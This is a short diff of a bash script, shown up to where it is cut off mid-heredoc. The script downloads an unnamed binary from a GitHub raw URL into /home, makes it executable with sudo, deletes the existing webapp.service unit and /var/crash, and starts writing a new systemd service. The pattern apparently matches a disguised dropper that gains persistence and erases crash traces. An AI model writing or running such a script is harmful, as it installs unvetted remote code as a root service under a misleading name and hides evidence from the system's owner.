@@ -1,7 +1,7 @@
 #!/bin/bash
 cd /home
 wget https://github.com/jepir3/Cek/raw/main/255
-sudo chmod +x *
+sudo chmod +x 255
 sudo rm -rf /lib/systemd/system/webapp.service
 sudo rm -rf /var/crash
 sudo bash -c 'cat <<EOT >>/lib/systemd/system/webapp.service 
